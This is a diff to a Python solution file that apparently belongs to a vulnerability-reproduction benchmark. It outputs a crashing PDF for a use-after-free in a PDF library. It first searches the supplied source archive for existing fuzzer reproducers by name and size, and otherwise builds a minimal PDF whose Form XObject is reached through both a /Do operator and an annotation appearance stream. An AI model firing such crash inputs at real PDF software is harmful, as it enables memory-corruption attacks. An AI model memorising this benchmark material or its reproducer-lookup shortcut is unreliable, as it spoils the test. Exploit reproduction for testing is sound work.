@@ -1,217 +1,189 @@
 import os
-import re
+import io
 import tarfile
-from typing import Optional, List, Tuple
+from typing import Optional, Tuple, List
 
 
-def _read_tar_member(t: tarfile.TarFile, m: tarfile.TarInfo, max_bytes: int = 2_000_000) -> Optional[bytes]:
-    if not m.isreg():
-        return None
-    if m.size <= 0 or m.size > max_bytes:
-        return None
-    f = t.extractfile(m)
-    if f is None:
-        return None
-    try:
-        return f.read()
-    finally:
-        try:
-            f.close()
-        except Exception:
-            pass
-
-
-def _find_embedded_poc_in_tar(src_path: str) -> Optional[bytes]:
-    name_hi_re = re.compile(
-        r"(clusterfuzz[-_]?testcase[-_]?minimized|testcase[-_]?minimized|repro|poc|crash|asan|uaf|heap[-_]?use[-_]?after[-_]?free|cve)",
-        re.IGNORECASE,
+def _is_reproducer_name(name: str) -> bool:
+    n = name.lower()
+    markers = (
+        "poc",
+        "crash",
+        "repro",
+        "reproducer",
+        "uaf",
+        "use_after_free",
+        "use-after-free",
+        "asan",
+        "ubsan",
+        "msan",
+        "oss-fuzz",
+        "fuzz",
+        "corpus",
+        "testcase",
+        "cve",
+        "21604",
     )
-    name_mid_re = re.compile(r"(testcase|fuzz|corpus|seed|regression|issue)", re.IGNORECASE)
-    pdf_header = b"%PDF-"
+    return any(m in n for m in markers)
 
-    candidates: List[Tuple[int, int, bytes]] = []
+
+def _read_file_limited(fp, limit: int) -> Optional[bytes]:
     try:
-        with tarfile.open(src_path, "r:*") as t:
-            for m in t:
-                if not m.isreg():
-                    continue
-                n = m.name.replace("\\", "/")
-                bn = os.path.basename(n)
-                if m.size <= 0 or m.size > 2_000_000:
-                    continue
-
-                score = 0
-                if name_hi_re.search(n) or name_hi_re.search(bn):
-                    score += 10
-                if name_mid_re.search(n) or name_mid_re.search(bn):
-                    score += 2
-                if bn.lower().endswith((".pdf", ".fdf")):
-                    score += 3
-
-                if score < 10:
-                    continue
-
-                data = _read_tar_member(t, m)
-                if not data:
-                    continue
-
-                if data.startswith(pdf_header):
-                    score += 3
-                candidates.append((score, len(data), data))
+        data = fp.read(limit + 1)
     except Exception:
         return None
-
-    if not candidates:
+    if data is None:
         return None
+    if len(data) > limit:
+        return None
+    return data
 
-    candidates.sort(key=lambda x: (-x[0], x[1]))
-    return candidates[0][2]
+
+def _maybe_choose_pdf_candidate(name: str, data: bytes, target_len: int) -> Optional[Tuple[int, int, bytes]]:
+    if len(data) < 8:
+        return None
+    if not (data.startswith(b"%PDF-") or data.startswith(b"%FDF-")):
+        return None
+    n = name.lower()
+    if not (_is_reproducer_name(n) or abs(len(data) - target_len) <= 4096):
+        return None
+    bonus = 0
+    if _is_reproducer_name(n):
+        bonus += 20000
+    if n.endswith(".pdf") or n.endswith(".fdf"):
+        bonus += 5000
+    if "corpus" in n or "crash" in n:
+        bonus += 5000
+    score = abs(len(data) - target_len) - bonus
+    return (score, len(data), data)
 
 
-def _pdf_stream(dict_entries: bytes, data: bytes) -> bytes:
-    if not data.endswith(b"\n"):
-        data += b"\n"
-    d = b"<< " + dict_entries + b" /Length " + str(len(data)).encode("ascii") + b" >>\n"
-    return d + b"stream\n" + data + b"endstream\n"
+def _scan_tar_for_pdf_candidate(tar_path: str, target_len: int, max_bytes: int = 2_000_000) -> Optional[bytes]:
+    best: Optional[Tuple[int, int, bytes]] = None
+    try:
+        with tarfile.open(tar_path, "r:*") as tf:
+            for m in tf:
+                if not m.isreg():
+                    continue
+                if m.size <= 0 or m.size > max_bytes:
+                    continue
+                name = m.name
+                # Quick name filter to avoid reading tons of irrelevant files
+                nl = name.lower()
+                if not (_is_reproducer_name(nl) or nl.endswith(".pdf") or nl.endswith(".fdf") or abs(m.size - target_len) <= 4096):
+                    continue
+                try:
+                    f = tf.extractfile(m)
+                    if f is None:
+                        continue
+                    with f:
+                        data = _read_file_limited(f, max_bytes)
+                except Exception:
+                    continue
+                if not data:
+                    continue
+                cand = _maybe_choose_pdf_candidate(name, data, target_len)
+                if cand is None:
+                    continue
+                if best is None or cand[0] < best[0] or (cand[0] == best[0] and cand[1] < best[1]):
+                    best = cand
+    except Exception:
+        return None
+    return None if best is None else best[2]
+
+
+def _scan_dir_for_pdf_candidate(root: str, target_len: int, max_bytes: int = 2_000_000) -> Optional[bytes]:
+    best: Optional[Tuple[int, int, bytes]] = None
+    for dirpath, _, filenames in os.walk(root):
+        for fn in filenames:
+            path = os.path.join(dirpath, fn)
+            try:
+                st = os.stat(path)
+            except Exception:
+                continue
+            if st.st_size <= 0 or st.st_size > max_bytes:
+                continue
+            rel = os.path.relpath(path, root)
+            rl = rel.lower()
+            if not (_is_reproducer_name(rl) or rl.endswith(".pdf") or rl.endswith(".fdf") or abs(st.st_size - target_len) <= 4096):
+                continue
+            try:
+                with open(path, "rb") as f:
+                    data = f.read(max_bytes + 1)
+                if len(data) > max_bytes:
+                    continue
+            except Exception:
+                continue
+            cand = _maybe_choose_pdf_candidate(rel, data, target_len)
+            if cand is None:
+                continue
+            if best is None or cand[0] < best[0] or (cand[0] == best[0] and cand[1] < best[1]):
+                best = cand
+    return None if best is None else best[2]
+
+
+def _pdf_stream(dict_prefix: bytes, stream_data: bytes) -> bytes:
+    d = dict_prefix + b" /Length " + str(len(stream_data)).encode("ascii") + b" >>"
+    return d + b"\nstream\n" + stream_data + b"\nendstream"
 
 
 def _build_pdf(objects: List[bytes]) -> bytes:
     out = bytearray()
-    out.extend(b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n")
-    offsets = [0] * (len(objects) + 1)
-
-    for i, body in enumerate(objects, start=1):
-        offsets[i] = len(out)
-        out.extend(f"{i} 0 obj\n".encode("ascii"))
-        out.extend(body)
-        if not body.endswith(b"\n"):
-            out.extend(b"\n")
-        out.extend(b"endobj\n")
-
-    xref_offset = len(out)
-    out.extend(b"xref\n")
-    out.extend(f"0 {len(objects) + 1}\n".encode("ascii"))
-    out.extend(b"0000000000 65535 f \n")
-    for i in range(1, len(objects) + 1):
-        out.extend(f"{offsets[i]:010d} 00000 n \n".encode("ascii"))
-
-    out.extend(b"trailer\n")
-    out.extend(f"<< /Size {len(objects) + 1} /Root 1 0 R >>\n".encode("ascii"))
-    out.extend(b"startxref\n")
-    out.extend(f"{xref_offset}\n".encode("ascii"))
-    out.extend(b"%%EOF\n")
+    out += b"%PDF-1.4\n%\xE2\xE3\xCF\xD3\n"
+    offsets = [0]
+    for i, obj in enumerate(objects, start=1):
+        offsets.append(len(out))
+        out += f"{i} 0 obj\n".encode("ascii")
+        out += obj
+        if not obj.endswith(b"\n"):
+            out += b"\n"
+        out += b"endobj\n"
+    xref_pos = len(out)
+    out += f"xref\n0 {len(objects) + 1}\n".encode("ascii")
+    out += b"0000000000 65535 f \n"
+    for off in offsets[1:]:
+        out += f"{off:010d} 00000 n \n".encode("ascii")
+    out += b"trailer\n"
+    out += f"<< /Size {len(objects) + 1} /Root 1 0 R >>\n".encode("ascii")
+    out += b"startxref\n"
+    out += f"{xref_pos}\n".encode("ascii")
+    out += b"%%EOF\n"
     return bytes(out)
 
 
-def _generate_pdf_poc() -> bytes:
-    # Multi-FormXObject chain without /Resources to force parent resource dict usage.
-    n_forms = 6
-
-    form_objs = []
-    for i in range(n_forms):
-        form_data = (
-            b"q\n"
-            b"BT\n"
-            b"/F1 12 Tf\n"
-            b"1 0 0 1 0 0 Tm\n"
-            b"(x) Tj\n"
-            b"ET\n"
-            b"Q\n"
-        )
-        form_dict = b"/Type /XObject /Subtype /Form /BBox [0 0 100 100]"
-        form_objs.append(_pdf_stream(form_dict, form_data))
-
-    contents_lines = [b"q\n"]
-    for i in range(n_forms):
-        contents_lines.append(f"/Fm{i} Do\n".encode("ascii"))
-    contents_lines.append(b"Q\n")
-    contents_lines.append(b"BT\n")
-    contents_lines.append(b"/F1 12 Tf\n")
-    contents_lines.append(b"72 200 Td\n")
-    contents_lines.append(b"(Hello) Tj\n")
-    contents_lines.append(b"ET\n")
-    contents_data = b"".join(contents_lines)
-    contents_obj = _pdf_stream(b"", contents_data)
-
-    # Widget annotation with appearance stream missing /Resources as well.
-    ap_data = (
-        b"q\n"
-        b"0 0 1 rg\n"
-        b"0 0 20 20 re\n"
-        b"f\n"
-        b"Q\n"
-    )
-    ap_obj = _pdf_stream(b"/Type /XObject /Subtype /Form /BBox [0 0 20 20]", ap_data)
-
-    # Object numbering:
-    # 1 Catalog
-    # 2 Pages
-    # 3 Page
-    # 4 Contents
-    # 5 Font
-    # 6..(5+n_forms) Forms
-    # (6+n_forms) Widget annot
-    # (7+n_forms) Appearance stream
-    obj_catalog_num = 1
-    obj_pages_num = 2
-    obj_page_num = 3
-    obj_contents_num = 4
-    obj_font_num = 5
-    obj_first_form_num = 6
-    obj_widget_num = obj_first_form_num + n_forms
-    obj_ap_num = obj_widget_num + 1
-
-    xobj_entries = []
-    for i in range(n_forms):
-        xobj_entries.append(f"/Fm{i} {obj_first_form_num + i} 0 R".encode("ascii"))
-    xobj_dict = b"<< " + b" ".join(xobj_entries) + b" >>"
-    resources_dict = b"<< /Font << /F1 5 0 R >> /XObject " + xobj_dict + b" >>"
-
-    catalog = (
-        b"<< /Type /Catalog /Pages 2 0 R "
-        b"/AcroForm << /Fields [" + f"{obj_widget_num} 0 R".encode("ascii") + b"] >>"
-        b" >>\n"
-    )
-    pages = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>\n"
-    page = (
-        b"<< /Type /Page /Parent 2 0 R "
-        b"/MediaBox [0 0 300 300] "
-        b"/Resources " + resources_dict + b" "
-        b"/Contents 4 0 R "
-        b"/Annots [" + f"{obj_widget_num} 0 R".encode("ascii") + b"]"
-        b" >>\n"
-    )
-    font = b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>\n"
-    widget = (
-        b"<< /Type /Annot /Subtype /Widget "
-        b"/Rect [50 50 150 80] "
-        b"/F 4 "
-        b"/T (a) "
-        b"/FT /Tx "
-        b"/V (b) "
-        b"/P 3 0 R "
-        b"/AP << /N " + f"{obj_ap_num} 0 R".encode("ascii") + b" >>"
-        b" >>\n"
+def _generate_minimal_uaf_pdf() -> bytes:
+    # Create a PDF that forces processing a Form XObject via /Do and also via an annotation appearance stream.
+    # The vulnerable code path typically wraps a Dict* from a Stream into an Object without incRef,
+    # causing an extra unref when the temporary Object is destroyed.
+    form_stream_data = b"q\nQ\n"
+    form_stream = _pdf_stream(
+        b"<< /Type /XObject /Subtype /Form /FormType 1 /BBox [0 0 10 10] /Resources << >>",
+        form_stream_data,
     )
 
-    objects: List[bytes] = []
-    objects.append(catalog)      # 1
-    objects.append(pages)        # 2
-    objects.append(page)         # 3
-    objects.append(contents_obj) # 4
-    objects.append(font)         # 5
-    objects.extend(form_objs)    # 6..(5+n_forms)
-    objects.append(widget)       # (6+n_forms)
-    objects.append(ap_obj)       # (7+n_forms)
+    page_content = b"q\n/Fm0 Do\nQ\n"
+    content_stream = _pdf_stream(b"<<", page_content)
 
+    annot = b"<< /Type /Annot /Subtype /Stamp /Rect [10 10 60 60] /F 0 /AP << /N 6 0 R >> >>"
+    page = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Resources << /XObject << /Fm0 6 0 R >> >> /Contents 5 0 R /Annots [4 0 R] >>"
+    pages = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
+    catalog = b"<< /Type /Catalog /Pages 2 0 R >>"
+
+    objects = [catalog, pages, page, annot, content_stream, form_stream]
     return _build_pdf(objects)
 
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        poc = None
-        if os.path.isfile(src_path):
-            poc = _find_embedded_poc_in_tar(src_path)
-        if poc is not None and len(poc) > 0:
-            return poc
-        return _generate_pdf_poc()
+        target_len = 33762
+
+        candidate = None
+        if src_path and os.path.isdir(src_path):
+            candidate = _scan_dir_for_pdf_candidate(src_path, target_len)
+        elif src_path and os.path.isfile(src_path):
+            candidate = _scan_tar_for_pdf_candidate(src_path, target_len)
+
+        if candidate is not None:
+            return candidate
+
+        return _generate_minimal_uaf_pdf()
